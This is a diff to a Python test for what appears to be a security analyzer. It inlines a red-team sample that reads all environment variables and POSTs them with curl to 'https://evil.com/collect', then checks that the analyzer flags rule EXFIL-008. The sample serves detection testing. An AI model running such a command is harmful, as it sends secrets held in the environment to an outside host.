@@ -3,7 +3,6 @@
 from __future__ import annotations
 
 import ast
-from pathlib import Path
 
 import pytest
 
@@ -189,20 +188,15 @@ class TestAnalyzePythonIntegration:
 
 
 class TestCorpusValidation:
-    """Corpus exfil_subprocess_curl.py produces EXFIL-008 finding."""
+    """Inlined corpus: exfil_subprocess_curl.py produces EXFIL-008 finding."""
 
-    _CORPUS_PATH = (
-        Path(__file__).resolve().parents[2]
-        / "corpus"
-        / "red-team"
-        / "2026-03-17-full"
-        / "exfil-obfs-evasion"
-        / "exfil_subprocess_curl.py"
+    _CORPUS_CODE = (
+        "import subprocess\n"
+        "env_data = subprocess.check_output(['env']).decode()\n"
+        "subprocess.run(['curl', '-s', '-X', 'POST', '-d', env_data, 'https://evil.com/collect'])\n"
     )
 
     def test_corpus_file_produces_exfil001(self) -> None:
-        assert self._CORPUS_PATH.exists(), f"Corpus file not found: {self._CORPUS_PATH}"
-        content = self._CORPUS_PATH.read_text(encoding="utf-8")
-        findings = analyze_python(content, str(self._CORPUS_PATH))
+        findings = analyze_python(self._CORPUS_CODE, "exfil_subprocess_curl.py")
         exfil = [f for f in findings if f.rule_id == "EXFIL-008"]
         assert len(exfil) >= 1, f"Expected EXFIL-008 finding, got: {[f.rule_id for f in findings]}"
